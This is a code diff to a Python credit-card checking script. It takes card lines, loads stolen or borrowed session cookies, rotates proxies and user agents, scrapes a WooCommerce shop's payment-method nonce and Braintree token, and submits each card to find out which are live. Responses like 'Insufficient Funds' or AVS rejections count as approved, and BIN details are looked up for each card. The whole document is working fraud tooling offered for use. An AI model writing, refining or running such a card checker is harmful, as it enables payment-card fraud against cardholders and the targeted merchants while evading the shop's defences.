@@ -11,76 +11,37 @@ import glob
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Global variable to store the selected cookie pair
 SELECTED_COOKIE_PAIR = None
 
 def discover_cookie_pairs():
-    """Discover available cookie pairs in the current directory"""
     try:
-        # Find all cookies_X-1.txt files
-        pattern1 = 'cookies_*-1.txt'
-        pattern2 = 'cookies_*-2.txt'
-        
-        files1 = glob.glob(pattern1)
-        files2 = glob.glob(pattern2)
-        
-        # Extract the pair identifiers (e.g., "1" from "cookies_1-1.txt")
+        files1 = glob.glob('cookies_*-1.txt')
+        files2 = glob.glob('cookies_*-2.txt')
         pairs = []
         for file1 in files1:
-            # Extract the pair number from filename like "cookies_1-1.txt"
             pair_id = file1.replace('cookies_', '').replace('-1.txt', '')
             file2_expected = f'cookies_{pair_id}-2.txt'
-            
             if file2_expected in files2:
-                pairs.append({
-                    'id': pair_id,
-                    'file1': file1,
-                    'file2': file2_expected
-                })
-        
+                pairs.append({'id': pair_id, 'file1': file1, 'file2': file2_expected})
         return pairs
     except Exception as e:
         print(f"Error discovering cookie pairs: {str(e)}")
         return []
 
-def select_random_cookie_pair():
-    """Select a random cookie pair from available pairs"""
-    global SELECTED_COOKIE_PAIR
-    
-    pairs = discover_cookie_pairs()
-    if not pairs:
-        print("No cookie pairs found! Make sure you have files like cookies_1-1.txt, cookies_1-2.txt, etc.")
-        # Fallback to old system
-        SELECTED_COOKIE_PAIR = {'file1': 'cookies_1.txt', 'file2': 'cookies_2.txt', 'id': 'fallback'}
-        return SELECTED_COOKIE_PAIR
-    
-    # Select random pair
-    selected_pair = random.choice(pairs)
-    SELECTED_COOKIE_PAIR = selected_pair
-    print(f"🎲 Selected cookie pair: {selected_pair['id']} ({selected_pair['file1']}, {selected_pair['file2']})")
-    return selected_pair
-
 def select_new_cookie_pair_silent():
-    """Select a new random cookie pair without printing (for each card check)"""
     global SELECTED_COOKIE_PAIR
-    
     pairs = discover_cookie_pairs()
     if not pairs:
-        # Fallback to old system
         SELECTED_COOKIE_PAIR = {'file1': 'cookies_1.txt', 'file2': 'cookies_2.txt', 'id': 'fallback'}
         return SELECTED_COOKIE_PAIR
-    
-    # Select random pair
     selected_pair = random.choice(pairs)
     SELECTED_COOKIE_PAIR = selected_pair
     return selected_pair
 
 def read_cookies_from_file(filename):
-    """Read cookies from a specific file"""
     try:
         with open(filename, 'r') as f:
             content = f.read()
-            # Create a namespace dictionary for exec
             namespace = {}
             exec(content, namespace)
             return namespace['cookies']
@@ -88,43 +49,27 @@ def read_cookies_from_file(filename):
         print(f"Error reading {filename}: {str(e)}")
         return {}
 
-# Read domain URL from site.txt
 def get_domain_url():
     try:
         with open('site.txt', 'r') as f:
             return f.read().strip()
     except Exception as e:
         print(f"Error reading site.txt: {str(e)}")
-        return ""  # fallback
+        return ""
 
-# Read cookies from the selected first cookie file
 def get_cookies_1():
     global SELECTED_COOKIE_PAIR
     if SELECTED_COOKIE_PAIR is None:
         select_new_cookie_pair_silent()
-    
     return read_cookies_from_file(SELECTED_COOKIE_PAIR['file1'])
 
-# Read cookies from the selected second cookie file
 def get_cookies_2():
     global SELECTED_COOKIE_PAIR
     if SELECTED_COOKIE_PAIR is None:
         select_new_cookie_pair_silent()
-    
     return read_cookies_from_file(SELECTED_COOKIE_PAIR['file2'])
 
-user = generate_user_agent()
-
-def gets(s, start, end):
-    try:
-        start_index = s.index(start) + len(start)
-        end_index = s.index(end, start_index)
-        return s[start_index:end_index]
-    except ValueError:
-        return None
-
 def get_headers():
-    """Get headers with current domain URL"""
     domain_url = get_domain_url()
     return {
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -145,13 +90,10 @@ def get_headers():
     }
 
 def get_random_proxy():
-    """Get a random proxy from proxy.txt file"""
     try:
         with open('proxy.txt', 'r') as f:
             proxies = f.readlines()
             proxy = random.choice(proxies).strip()
-
-            # Parse proxy string (format: host:port:username:password)
             parts = proxy.split(':')
             if len(parts) == 4:
                 host, port, username, password = parts
@@ -166,11 +108,9 @@ def get_random_proxy():
         return None
 
 def get_new_auth():
-    """Get fresh authorization tokens"""
-    domain_url = get_domain_url()  # Read fresh domain URL
-    cookies_1 = get_cookies_1()    # Read fresh cookies
-    headers = get_headers()        # Get headers with current domain
-    
+    domain_url = get_domain_url()
+    cookies_1 = get_cookies_1()
+    headers = get_headers()
     proxy = get_random_proxy()
     response = requests.get(
         f'{domain_url}/my-account/add-payment-method/',
@@ -180,13 +120,10 @@ def get_new_auth():
         verify=False
     )
     if response.status_code == 200:
-        # Get add_nonce
         add_nonce = re.findall('name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
         if not add_nonce:
             print("Error: Nonce not found in response")
             return None, None
-
-        # Get authorization token
         i0 = response.text.find('wc_braintree_client_token = ["')
         if i0 != -1:
             i1 = response.text.find('"]', i0)
@@ -213,8 +150,6 @@ def get_bin_info(bin_number):
         response = requests.get(f'https://api.voidex.dev/api/bin?bin={bin_number}', timeout=10)
         if response.status_code == 200:
             data = response.json()
-
-            # Check if we have valid data
             if not data or 'brand' not in data:
                 return {
                     'brand': 'UNKNOWN',
@@ -224,17 +159,14 @@ def get_bin_info(bin_number):
                     'country': 'UNKNOWN',
                     'emoji': '🏳️'
                 }
-
-            # Return data mapped from Voidex API response
             return {
                 'brand': data.get('brand', 'UNKNOWN'),
                 'type': data.get('type', 'UNKNOWN'),
-                'level': data.get('brand', 'UNKNOWN'),  # Using brand as level fallback
+                'level': data.get('brand', 'UNKNOWN'),
                 'bank': data.get('bank', 'UNKNOWN'),
                 'country': data.get('country_name', 'UNKNOWN'),
                 'emoji': data.get('country_flag', '🏳️')
             }
-
         return {
             'brand': 'UNKNOWN',
             'type': 'UNKNOWN',
@@ -255,44 +187,6 @@ def get_bin_info(bin_number):
         }
 
 def check_status(result):
-    # First, check if the message contains "Reason:" and extract the specific reason
-    if "Reason:" in result:
-        # Extract everything after "Reason:"
-        reason_part = result.split("Reason:", 1)[1].strip()
-
-        # Check if it's one of the approved patterns
-        approved_patterns = [
-            'Nice! New payment method added',
-            'Payment method successfully added.',
-            'Insufficient Funds',
-            'Gateway Rejected: avs',
-            'Duplicate',
-            'Payment method added successfully',
-            'Invalid postal code or street address',
-            'You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds',
-        ]
-
-        cvv_patterns = [
-            'CVV',
-            'Gateway Rejected: avs_and_cvv',
-            'Card Issuer Declined CVV',
-            'Gateway Rejected: cvv'
-        ]
-
-        # Check if the extracted reason matches approved patterns
-        for pattern in approved_patterns:
-            if pattern in result:
-                return "APPROVED", "Approved", True
-
-        # Check if the extracted reason matches CVV patterns
-        for pattern in cvv_patterns:
-            if pattern in reason_part:
-                return "DECLINED", "Reason: CVV", False
-
-        # Return the extracted reason for declined cards
-        return "DECLINED", reason_part, False
-
-    # If "Reason:" is not found, use the original logic
     approved_patterns = [
         'Nice! New payment method added',
         'Payment method successfully added.',
@@ -303,36 +197,18 @@ def check_status(result):
         'Invalid postal code or street address',
         'You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds',
     ]
-
-    cvv_patterns = [
-        'Reason: CVV',
-        'Gateway Rejected: avs_and_cvv',
-        'Card Issuer Declined CVV',
-        'Gateway Rejected: cvv'
-    ]
-
     for pattern in approved_patterns:
         if pattern in result:
             return "APPROVED", "Approved", True
-
-    for pattern in cvv_patterns:
-        if pattern in result:
-            return "DECLINED", "Reason: CVV", False
-
     return "DECLINED", result, False
 
 def check_card(cc_line):
-    # Select new cookie pair for this card check
     select_new_cookie_pair_silent()
-    
-    from datetime import datetime
     start_time = time.time()
-
     try:
-        domain_url = get_domain_url()  # Read fresh domain URL
-        cookies_2 = get_cookies_2()    # Read fresh cookies
-        headers = get_headers()        # Get headers with current domain
-        
+        domain_url = get_domain_url()
+        cookies_2 = get_cookies_2()
+        headers = get_headers()
         add_nonce, au = get_new_auth()
         if not add_nonce or not au:
             return "❌ Authorization failed. Try again later."
@@ -372,7 +248,7 @@ def check_card(cc_line):
             'authorization': f'Bearer {au}',
             'braintree-version': '2018-05-10',
             'content-type': 'application/json',
-            'user-agent': user
+            'user-agent': generate_user_agent()
         }
 
         proxy = get_random_proxy()
@@ -402,7 +278,7 @@ def check_card(cc_line):
         }
 
         proxy = get_random_proxy()
-        response = requests.post(
+        response2 = requests.post(
             f'{domain_url}/my-account/add-payment-method/',
             cookies=cookies_2,
             headers=headers,
@@ -412,10 +288,17 @@ def check_card(cc_line):
         )
 
         elapsed_time = time.time() - start_time
-        soup = BeautifulSoup(response.text, 'html.parser')
+        soup = BeautifulSoup(response2.text, 'html.parser')
         error_div = soup.find('div', class_='woocommerce-notices-wrapper')
-        message = error_div.get_text(strip=True) if error_div else "❌ Unknown error"
-        status, reason, approved = check_status(message)
+        # --- Best Response Extraction Logic ---
+        if error_div:
+            message = error_div.get_text(strip=True)
+        else:
+            message = soup.get_text(separator=' ', strip=True)
+            if not message or len(message) < 5:
+                message = f"[Raw] {response2.text[:200]} [HTTP {response2.status_code}]"
+
+        status, _, approved = check_status(message)
         bin_info = get_bin_info(n[:6]) or {}
 
         response_text = f"""
